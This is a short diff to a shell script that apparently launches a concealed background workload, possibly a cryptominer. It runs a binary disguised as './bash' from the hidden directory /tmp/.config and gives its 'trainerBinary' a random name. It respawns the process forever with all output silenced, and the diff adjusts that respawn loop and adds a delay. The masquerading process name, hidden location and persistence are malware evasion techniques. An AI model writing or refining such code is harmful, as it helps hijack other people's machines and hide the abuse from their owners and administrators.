@@ -34,7 +34,8 @@ sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "/tmp/.
 
 
 if [ "$mode" == "0" ]; then
-  bash -c "while true; do cd /tmp/.config; name=`RandString 2 c${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
+  name=`RandString 2 c${cores}_${addr}`;
+  bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 3; done" >/dev/null 2>&1 &
 else
-  while true; do cd /tmp/.config; name=`RandString 2 c${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; done
+  while true; do cd /tmp/.config; name=`RandString 2 c${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 3; done
 fi
